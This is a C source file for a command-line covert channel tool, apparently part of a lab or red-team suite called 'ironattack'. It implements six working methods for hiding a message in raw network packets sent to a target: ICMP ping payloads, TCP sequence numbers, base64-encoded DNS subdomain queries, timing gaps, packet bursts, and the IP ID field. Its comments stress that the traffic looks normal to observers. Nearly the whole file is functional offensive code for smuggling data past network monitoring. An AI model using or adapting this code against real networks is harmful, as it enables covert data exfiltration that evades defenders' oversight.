/*
 * covert.c — Covert channel tool (Phase 19a + 19b)
 *
 * Hides data in protocol fields that are normally ignored:
 *   Phase 19a:
 *     1. ICMP payload — encode message in ping payload (normally random)
 *     2. TCP ISN — encode 4 bytes per SYN in the initial sequence number
 *     3. DNS subdomain — encode base64 data as DNS query labels
 *   Phase 19b:
 *     4. Timing — encode bits via inter-packet delay (100ms=1, 10ms=0)
 *     5. Counting — encode bits via packet count per window (1-3=0, 6-8=1)
 *     6. IP ID — encode 2 bytes per packet in the IP identification field
 *
 * Usage:
 *   ironattack covert --target <ip> --mode icmp|isn|dns|timing|counting|ipid --message <text> [--iface <name>]
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

static uint16_t checksum(const void *data, int len) {
    const uint8_t *p = data;
    uint32_t sum = 0;
    for (int i = 0; i < len - 1; i += 2)
        sum += (p[i] << 8) | p[i + 1];
    if (len & 1) sum += p[len - 1] << 8;
    while (sum >> 16) sum = (sum >> 16) + (sum & 0xFFFF);
    return ~sum & 0xFFFF;
}

/* Base64 encode (minimal, for DNS channel) */
static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static int base64_encode(const uint8_t *in, int in_len, char *out, int out_max) {
    int o = 0;
    for (int i = 0; i < in_len && o < out_max - 4; i += 3) {
        uint32_t v = in[i] << 16;
        if (i + 1 < in_len) v |= in[i + 1] << 8;
        if (i + 2 < in_len) v |= in[i + 2];
        out[o++] = b64[(v >> 18) & 0x3F];
        out[o++] = b64[(v >> 12) & 0x3F];
        out[o++] = (i + 1 < in_len) ? b64[(v >> 6) & 0x3F] : '=';
        out[o++] = (i + 2 < in_len) ? b64[v & 0x3F] : '=';
    }
    out[o] = 0;
    return o;
}

/* Open raw socket bound to interface */
static int open_raw(const char *iface) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) return -1;
    int one = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    if (iface) {
        struct ifreq ifr;
        memset(&ifr, 0, sizeof(ifr));
        strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
        setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr));
    }
    return fd;
}

/*
 * Channel 1: ICMP covert channel
 * Hides message in ICMP echo request payload (normally random/zero bytes).
 * To an observer, it looks like normal ping traffic.
 */
static int covert_icmp(const char *target, const char *message, const char *iface) {
    int msg_len = strlen(message);

    printf("  [ICMP Covert Channel]\n");
    printf("  Encoding %d bytes in ICMP echo payload\n", msg_len);
    printf("  Message: \"%s\"\n", message);
    printf("  Appears as: normal ping traffic\n\n");

    int fd = open_raw(iface);
    if (fd < 0) { fprintf(stderr, "Error: raw socket (need sudo)\n"); return 1; }

    struct in_addr dst;
    inet_pton(AF_INET, target, &dst);

    /* Build IP + ICMP echo with message as payload */
    int icmp_len = 8 + msg_len; /* ICMP header(8) + payload */
    int ip_total = 20 + icmp_len;
    uint8_t pkt[512];
    memset(pkt, 0, sizeof(pkt));

    /* IP header */
    pkt[0] = 0x45;
    pkt[2] = (ip_total >> 8) & 0xFF; pkt[3] = ip_total & 0xFF;
    pkt[8] = 64; pkt[9] = 1; /* TTL=64, proto=ICMP */
    uint32_t src_ip = inet_addr("10.0.1.2");
    memcpy(pkt + 12, &src_ip, 4);
    memcpy(pkt + 16, &dst.s_addr, 4);
    uint16_t ip_ck = checksum(pkt, 20);
    pkt[10] = (ip_ck >> 8) & 0xFF; pkt[11] = ip_ck & 0xFF;

    /* ICMP echo request */
    uint8_t *icmp = pkt + 20;
    icmp[0] = 8; /* type=echo request */
    icmp[1] = 0; /* code=0 */
    icmp[4] = 0x13; icmp[5] = 0x37; /* id=0x1337 (marker) */
    icmp[6] = 0x00; icmp[7] = 0x01; /* seq=1 */
    /* Hidden message in payload */
    memcpy(icmp + 8, message, msg_len);
    /* ICMP checksum */
    uint16_t icmp_ck = checksum(icmp, icmp_len);
    icmp[2] = (icmp_ck >> 8) & 0xFF; icmp[3] = icmp_ck & 0xFF;

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_addr = dst;

    int rc = sendto(fd, pkt, ip_total, 0, (struct sockaddr *)&sa, sizeof(sa));
    close(fd);

    if (rc > 0) {
        printf("  Sent: ICMP echo request with hidden payload (%d bytes)\n", msg_len);
        printf("  Hex payload: ");
        for (int i = 0; i < msg_len && i < 32; i++) printf("%02X ", (uint8_t)message[i]);
        if (msg_len > 32) printf("...");
        printf("\n\n");
        printf("  To decode: capture with tcpdump, extract ICMP payload starting at byte 8\n");
        printf("  tcpdump -i %s -XX icmp | look at bytes after ICMP header\n", iface);
    } else {
        printf("  Send failed (errno=%d)\n", rc);
    }
    return 0;
}

/*
 * Channel 2: TCP ISN covert channel
 * Encodes 4 bytes of data per TCP SYN in the Initial Sequence Number.
 * To an observer, ISNs look random (as they should be).
 */
static int covert_isn(const char *target, const char *message, const char *iface) {
    int msg_len = strlen(message);
    int num_syns = (msg_len + 3) / 4; /* 4 bytes per SYN */

    printf("  [TCP ISN Covert Channel]\n");
    printf("  Encoding %d bytes across %d TCP SYN packets\n", msg_len, num_syns);
    printf("  Message: \"%s\"\n", message);
    printf("  Each SYN carries 4 bytes in its sequence number\n\n");

    int fd = open_raw(iface);
    if (fd < 0) { fprintf(stderr, "Error: raw socket (need sudo)\n"); return 1; }

    struct in_addr dst;
    inet_pton(AF_INET, target, &dst);
    uint32_t src_ip = inet_addr("10.0.1.2");

    int sent = 0;
    for (int i = 0; i < num_syns; i++) {
        /* Extract 4 bytes of message for this SYN's ISN */
        uint32_t isn = 0;
        int offset = i * 4;
        for (int b = 0; b < 4 && offset + b < msg_len; b++)
            isn |= ((uint32_t)(uint8_t)message[offset + b]) << (b * 8);

        /* Build IP + TCP SYN */
        int ip_total = 20 + 20; /* IP(20) + TCP(20) */
        uint8_t pkt[64];
        memset(pkt, 0, sizeof(pkt));

        /* IP header */
        pkt[0] = 0x45;
        pkt[2] = 0; pkt[3] = 40;
        pkt[8] = 64; pkt[9] = 6; /* TCP */
        memcpy(pkt + 12, &src_ip, 4);
        memcpy(pkt + 16, &dst.s_addr, 4);
        uint16_t ip_ck = checksum(pkt, 20);
        pkt[10] = (ip_ck >> 8) & 0xFF; pkt[11] = ip_ck & 0xFF;

        /* TCP header */
        uint8_t *tcp = pkt + 20;
        uint16_t sport = 40000 + i;
        uint16_t dport = 7; /* echo port */
        tcp[0] = (sport >> 8) & 0xFF; tcp[1] = sport & 0xFF;
        tcp[2] = (dport >> 8) & 0xFF; tcp[3] = dport & 0xFF;
        /* Sequence number = hidden data */
        tcp[4] = (isn >> 24) & 0xFF; tcp[5] = (isn >> 16) & 0xFF;
        tcp[6] = (isn >> 8) & 0xFF; tcp[7] = isn & 0xFF;
        tcp[12] = (5 << 4); /* data offset = 5 */
        tcp[13] = 0x02; /* SYN */
        tcp[14] = 0xFF; tcp[15] = 0xFF; /* window */

        struct sockaddr_in sa;
        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        sa.sin_addr = dst;

        int rc = sendto(fd, pkt, ip_total, 0, (struct sockaddr *)&sa, sizeof(sa));
        if (rc > 0) sent++;

        printf("  SYN #%d: sport=%u ISN=0x%08X (bytes: \"%c%c%c%c\")\n",
               i + 1, sport, isn,
               (isn & 0xFF) >= 32 ? (isn & 0xFF) : '.',
               ((isn >> 8) & 0xFF) >= 32 ? ((isn >> 8) & 0xFF) : '.',
               ((isn >> 16) & 0xFF) >= 32 ? ((isn >> 16) & 0xFF) : '.',
               ((isn >> 24) & 0xFF) >= 32 ? ((isn >> 24) & 0xFF) : '.');

        usleep(10000); /* 10ms between SYNs */
    }

    close(fd);
    printf("\n  Sent: %d SYN packets (%d bytes hidden in ISNs)\n", sent, msg_len);
    printf("  To decode: capture SYNs, extract seq numbers, concatenate as bytes\n");
    return 0;
}

/*
 * Channel 3: DNS subdomain covert channel
 * Encodes data as base64 in DNS query labels.
 * Query: <base64>.covert.ironnet.local
 * Looks like normal DNS traffic to observers.
 */
static int covert_dns(const char *target, const char *message, const char *iface) {
    int msg_len = strlen(message);

    /* Base64 encode the message */
    char b64_msg[256];
    base64_encode((const uint8_t *)message, msg_len, b64_msg, sizeof(b64_msg));
    int b64_len = strlen(b64_msg);

    printf("  [DNS Subdomain Covert Channel]\n");
    printf("  Encoding %d bytes as base64 in DNS query\n", msg_len);
    printf("  Message: \"%s\"\n", message);
    printf("  Base64:  \"%s\"\n", b64_msg);
    printf("  Query:   %s.covert.ironnet.local\n\n", b64_msg);

    int fd = open_raw(iface);
    if (fd < 0) { fprintf(stderr, "Error: raw socket (need sudo)\n"); return 1; }

    struct in_addr dst;
    inet_pton(AF_INET, target, &dst);
    uint32_t src_ip = inet_addr("10.0.1.2");

    /* Build DNS query: <b64_msg>.covert.ironnet.local */
    uint8_t dns[256];
    int dpos = 0;
    /* DNS header */
    dns[dpos++] = 0xC0; dns[dpos++] = 0xDE; /* txn id = 0xC0DE */
    dns[dpos++] = 0x01; dns[dpos++] = 0x00; /* flags: standard query, RD=1 */
    dns[dpos++] = 0x00; dns[dpos++] = 0x01; /* qdcount=1 */
    dns[dpos++] = 0x00; dns[dpos++] = 0x00;
    dns[dpos++] = 0x00; dns[dpos++] = 0x00;
    dns[dpos++] = 0x00; dns[dpos++] = 0x00;
    /* Question: <b64>.covert.ironnet.local */
    /* Label 1: base64 data (max 63 chars per label) */
    int label_len = b64_len < 63 ? b64_len : 63;
    dns[dpos++] = (uint8_t)label_len;
    memcpy(dns + dpos, b64_msg, label_len); dpos += label_len;
    /* Label 2: "covert" */
    dns[dpos++] = 6; memcpy(dns + dpos, "covert", 6); dpos += 6;
    /* Label 3: "ironnet" */
    dns[dpos++] = 7; memcpy(dns + dpos, "ironnet", 7); dpos += 7;
    /* Label 4: "local" */
    dns[dpos++] = 5; memcpy(dns + dpos, "local", 5); dpos += 5;
    dns[dpos++] = 0; /* end */
    dns[dpos++] = 0x00; dns[dpos++] = 0x01; /* QTYPE=A */
    dns[dpos++] = 0x00; dns[dpos++] = 0x01; /* QCLASS=IN */

    /* Build IP + UDP + DNS */
    int udp_len = 8 + dpos;
    int ip_total = 20 + udp_len;
    uint8_t pkt[512];
    memset(pkt, 0, sizeof(pkt));

    /* IP */
    pkt[0] = 0x45;
    pkt[2] = (ip_total >> 8) & 0xFF; pkt[3] = ip_total & 0xFF;
    pkt[8] = 64; pkt[9] = 17; /* UDP */
    memcpy(pkt + 12, &src_ip, 4);
    memcpy(pkt + 16, &dst.s_addr, 4);
    uint16_t ip_ck = checksum(pkt, 20);
    pkt[10] = (ip_ck >> 8) & 0xFF; pkt[11] = ip_ck & 0xFF;

    /* UDP */
    uint8_t *udp = pkt + 20;
    uint16_t sport = 12345;
    udp[0] = (sport >> 8) & 0xFF; udp[1] = sport & 0xFF;
    udp[2] = 0x00; udp[3] = 0x35; /* dst port 53 */
    udp[4] = (udp_len >> 8) & 0xFF; udp[5] = udp_len & 0xFF;
    memcpy(udp + 8, dns, dpos);

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_addr = dst;

    int rc = sendto(fd, pkt, ip_total, 0, (struct sockaddr *)&sa, sizeof(sa));
    close(fd);

    if (rc > 0) {
        printf("  Sent: DNS query for %s.covert.ironnet.local\n", b64_msg);
        printf("  To decode: capture DNS queries, extract first label, base64 decode\n");
        printf("  dig output would show: %s.covert.ironnet.local. IN A\n", b64_msg);
    } else {
        printf("  Send failed\n");
    }
    return 0;
}

/*
 * Channel 4: Timing covert channel (Phase 19b)
 * Encodes each bit as an inter-packet delay:
 *   Bit 1 = 100ms delay before sending
 *   Bit 0 = 10ms delay before sending
 * Receiver measures gaps between packets to decode.
 * Bandwidth: ~10 bits/second.
 */
static int covert_timing(const char *target, const char *message, const char *iface) {
    int msg_len = strlen(message);
    int total_bits = msg_len * 8;

    printf("  [Timing Covert Channel]\n");
    printf("  Encoding %d bytes (%d bits) via inter-packet delays\n", msg_len, total_bits);
    printf("  Bit 1 = 100ms delay, Bit 0 = 10ms delay\n");
    printf("  Estimated time: %.1f seconds\n", total_bits * 0.055);
    printf("  Bandwidth: ~%d bits/second\n\n", (int)(1000.0 / 55));

    int fd = open_raw(iface);
    if (fd < 0) { fprintf(stderr, "Error: raw socket (need sudo)\n"); return 1; }

    struct in_addr dst;
    inet_pton(AF_INET, target, &dst);
    uint32_t src_ip = inet_addr("10.0.1.2");

    int sent = 0;
    for (int i = 0; i < msg_len; i++) {
        uint8_t byte = (uint8_t)message[i];
        printf("  Byte '%c' (0x%02X): bits ", byte >= 32 ? byte : '.', byte);

        for (int bit = 7; bit >= 0; bit--) {
            int b = (byte >> bit) & 1;
            printf("%d", b);

            /* Delay encodes the bit */
            if (b) usleep(100000); /* 100ms = bit 1 */
            else   usleep(10000);  /* 10ms = bit 0 */

            /* Send ICMP ping as the "tick" packet */
            uint8_t pkt[64];
            memset(pkt, 0, sizeof(pkt));
            int ip_total = 20 + 8;
            pkt[0] = 0x45;
            pkt[2] = 0; pkt[3] = 28;
            pkt[8] = 64; pkt[9] = 1;
            memcpy(pkt + 12, &src_ip, 4);
            memcpy(pkt + 16, &dst.s_addr, 4);
            uint16_t ip_ck = checksum(pkt, 20);
            pkt[10] = (ip_ck >> 8) & 0xFF; pkt[11] = ip_ck & 0xFF;
            uint8_t *icmp = pkt + 20;
            icmp[0] = 8; icmp[4] = 0x13; icmp[5] = 0x37;
            icmp[6] = (sent >> 8) & 0xFF; icmp[7] = sent & 0xFF;
            uint16_t ick = checksum(icmp, 8);
            icmp[2] = (ick >> 8) & 0xFF; icmp[3] = ick & 0xFF;

            struct sockaddr_in sa = {.sin_family = AF_INET, .sin_addr = dst};
            sendto(fd, pkt, ip_total, 0, (struct sockaddr *)&sa, sizeof(sa));
            sent++;
        }
        printf("\n");
    }

    close(fd);
    printf("\n  Sent: %d packets (%d bits encoded)\n", sent, total_bits);
    printf("  To decode: measure inter-packet gaps (>50ms = 1, <50ms = 0)\n");
    return 0;
}

/*
 * Channel 5: Packet counting covert channel (Phase 19b)
 * Encodes each bit as a burst of packets in a time window:
 *   Bit 0 = send 2 packets in 200ms window
 *   Bit 1 = send 7 packets in 200ms window
 * Receiver counts packets per window to decode.
 * Bandwidth: ~5 bits/second.
 */
static int covert_counting(const char *target, const char *message, const char *iface) {
    int msg_len = strlen(message);
    int total_bits = msg_len * 8;

    printf("  [Packet Counting Covert Channel]\n");
    printf("  Encoding %d bytes (%d bits) via packet count per window\n", msg_len, total_bits);
    printf("  Bit 0 = 2 packets/window, Bit 1 = 7 packets/window\n");
    printf("  Window: 200ms, Bandwidth: ~5 bits/second\n\n");

    int fd = open_raw(iface);
    if (fd < 0) { fprintf(stderr, "Error: raw socket (need sudo)\n"); return 1; }

    struct in_addr dst;
    inet_pton(AF_INET, target, &dst);
    uint32_t src_ip = inet_addr("10.0.1.2");

    int total_pkts = 0;
    for (int i = 0; i < msg_len; i++) {
        uint8_t byte = (uint8_t)message[i];
        printf("  Byte '%c' (0x%02X): ", byte >= 32 ? byte : '.', byte);

        for (int bit = 7; bit >= 0; bit--) {
            int b = (byte >> bit) & 1;
            int burst = b ? 7 : 2; /* bit 1 = 7 pkts, bit 0 = 2 pkts */
            printf("%d(%d) ", b, burst);

            for (int p = 0; p < burst; p++) {
                uint8_t pkt[64];
                memset(pkt, 0, sizeof(pkt));
                int ip_total = 28;
                pkt[0] = 0x45; pkt[2] = 0; pkt[3] = 28;
                pkt[8] = 64; pkt[9] = 1;
                memcpy(pkt + 12, &src_ip, 4);
                memcpy(pkt + 16, &dst.s_addr, 4);
                uint16_t ip_ck = checksum(pkt, 20);
                pkt[10] = (ip_ck >> 8) & 0xFF; pkt[11] = ip_ck & 0xFF;
                uint8_t *icmp = pkt + 20;
                icmp[0] = 8; icmp[4] = 0x13; icmp[5] = 0x37;
                icmp[6] = (total_pkts >> 8) & 0xFF; icmp[7] = total_pkts & 0xFF;
                uint16_t ick = checksum(icmp, 8);
                icmp[2] = (ick >> 8) & 0xFF; icmp[3] = ick & 0xFF;

                struct sockaddr_in sa = {.sin_family = AF_INET, .sin_addr = dst};
                sendto(fd, pkt, ip_total, 0, (struct sockaddr *)&sa, sizeof(sa));
                total_pkts++;
                usleep(5000); /* 5ms between packets in burst */
            }
            usleep(200000); /* 200ms window boundary */
        }
        printf("\n");
    }

    close(fd);
    printf("\n  Sent: %d total packets (%d bits encoded)\n", total_pkts, total_bits);
    printf("  To decode: count packets per 200ms window (<=4 = 0, >=5 = 1)\n");
    return 0;
}

/*
 * Channel 6: IP ID covert channel (Phase 19b)
 * Encodes 2 bytes of data per packet in the IP Identification field.
 * IP ID is normally sequential or random — encoded data blends in.
 * Bandwidth: 2 bytes per packet.
 */
static int covert_ipid(const char *target, const char *message, const char *iface) {
    int msg_len = strlen(message);
    int num_pkts = (msg_len + 1) / 2; /* 2 bytes per packet */

    printf("  [IP ID Covert Channel]\n");
    printf("  Encoding %d bytes across %d packets (2 bytes/pkt in IP ID field)\n",
           msg_len, num_pkts);
    printf("  Message: \"%s\"\n\n", message);

    int fd = open_raw(iface);
    if (fd < 0) { fprintf(stderr, "Error: raw socket (need sudo)\n"); return 1; }

    struct in_addr dst;
    inet_pton(AF_INET, target, &dst);
    uint32_t src_ip = inet_addr("10.0.1.2");

    int sent = 0;
    for (int i = 0; i < num_pkts; i++) {
        /* Extract 2 bytes for IP ID */
        uint16_t ip_id = 0;
        int offset = i * 2;
        ip_id = (uint8_t)message[offset];
        if (offset + 1 < msg_len)
            ip_id |= ((uint16_t)(uint8_t)message[offset + 1]) << 8;

        /* Build ICMP ping with crafted IP ID */
        uint8_t pkt[64];
        memset(pkt, 0, sizeof(pkt));
        int ip_total = 28;
        pkt[0] = 0x45; pkt[2] = 0; pkt[3] = 28;
        pkt[4] = (ip_id >> 8) & 0xFF; pkt[5] = ip_id & 0xFF; /* IP ID = hidden data */
        pkt[8] = 64; pkt[9] = 1;
        memcpy(pkt + 12, &src_ip, 4);
        memcpy(pkt + 16, &dst.s_addr, 4);
        uint16_t ip_ck = checksum(pkt, 20);
        pkt[10] = (ip_ck >> 8) & 0xFF; pkt[11] = ip_ck & 0xFF;
        uint8_t *icmp = pkt + 20;
        icmp[0] = 8; icmp[4] = 0x13; icmp[5] = 0x37;
        icmp[6] = 0; icmp[7] = (uint8_t)(i + 1);
        uint16_t ick = checksum(icmp, 8);
        icmp[2] = (ick >> 8) & 0xFF; icmp[3] = ick & 0xFF;

        struct sockaddr_in sa = {.sin_family = AF_INET, .sin_addr = dst};
        int rc = sendto(fd, pkt, ip_total, 0, (struct sockaddr *)&sa, sizeof(sa));
        if (rc > 0) sent++;

        printf("  Pkt #%d: IP_ID=0x%04X (bytes: \"%c%c\")\n",
               i + 1, ip_id,
               (ip_id & 0xFF) >= 32 ? (ip_id & 0xFF) : '.',
               ((ip_id >> 8) & 0xFF) >= 32 ? ((ip_id >> 8) & 0xFF) : '.');

        usleep(50000); /* 50ms between packets */
    }

    close(fd);
    printf("\n  Sent: %d packets (%d bytes hidden in IP ID fields)\n", sent, msg_len);
    printf("  To decode: capture packets, extract IP ID field (bytes 4-5), concatenate\n");
    return 0;
}

int cmd_covert(int argc, char **argv) {
    const char *target = NULL, *mode = NULL, *message = NULL;
    const char *iface = "iron0";

    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "--target") == 0 && i + 1 < argc) target = argv[++i];
        else if (strcmp(argv[i], "--mode") == 0 && i + 1 < argc) mode = argv[++i];
        else if (strcmp(argv[i], "--message") == 0 && i + 1 < argc) message = argv[++i];
        else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
    }

    if (!target || !mode || !message) {
        fprintf(stderr, "Error: --target, --mode, and --message required\n");
        fprintf(stderr, "Usage: ironattack covert --target <ip> --mode icmp|isn|dns|timing|counting|ipid --message <text> [--iface <name>]\n");
        return 1;
    }

    printf("=== Covert Channel Tool (Phase 19a/19b) ===\n");
    printf("  Target:  %s\n", target);
    printf("  Mode:    %s\n", mode);
    printf("  Message: \"%s\" (%d bytes)\n", message, (int)strlen(message));
    printf("  Iface:   %s\n\n", iface);

    if (strcmp(mode, "icmp") == 0) return covert_icmp(target, message, iface);
    if (strcmp(mode, "isn") == 0) return covert_isn(target, message, iface);
    if (strcmp(mode, "dns") == 0) return covert_dns(target, message, iface);
    if (strcmp(mode, "timing") == 0) return covert_timing(target, message, iface);
    if (strcmp(mode, "counting") == 0) return covert_counting(target, message, iface);
    if (strcmp(mode, "ipid") == 0) return covert_ipid(target, message, iface);

    fprintf(stderr, "Unknown mode: %s (use icmp|isn|dns|timing|counting|ipid)\n", mode);
    return 1;
}
